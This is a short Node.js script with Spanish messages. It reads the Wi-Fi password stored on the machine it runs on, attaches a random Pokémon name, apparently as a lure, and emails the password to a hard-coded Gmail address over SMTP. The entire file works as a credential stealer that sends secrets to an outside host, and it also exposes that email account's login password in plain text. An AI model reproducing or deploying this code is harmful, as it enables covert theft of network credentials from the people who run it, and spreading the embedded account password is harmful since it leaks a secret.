const wifiPassword = require('wifi-password');
const pokemon = require('pokemon');
var email 	= require("emailjs");

var server 	= email.server.connect({
    user:    "georgepk002@gmail.com", 
    password:"nothingelse", 
    host:    "smtp.gmail.com", 
    ssl:     true
 });
var pk = 'mas tu pokemon :'+ pokemon.random();
var pwd;
wifiPassword().then(password => {
    pwd = 'Aqui tienes tu password :' + password +' - '+pk ;
    console.log(pwd);   
    server.send({
        text:    pwd, 
        from:    "<georgepk002@gmail.com>", 
        to:      "<georgepk002@gmail.com>",
        cc:      "",
        subject: "wifi-password"
     }, function(err, message) { console.log(err || "Mensaje enviado"); });
     
 });




